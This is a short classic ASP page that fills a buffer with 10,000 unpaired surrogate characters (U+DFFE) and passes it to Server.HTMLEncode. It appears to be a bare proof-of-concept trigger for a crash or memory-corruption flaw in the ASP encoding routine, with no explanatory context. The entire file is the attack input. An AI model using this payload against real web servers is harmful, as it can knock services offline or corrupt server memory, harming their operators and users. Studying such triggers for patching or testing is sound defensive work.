<%@language=vbscript%>
<%
Dim buff 
Dim i 
For i=1 to 10000 
    buff = buff & ChrW(57342) ' 0xDFFE 
Next 
Response.Write Server.HTMLEncode(buff)
%>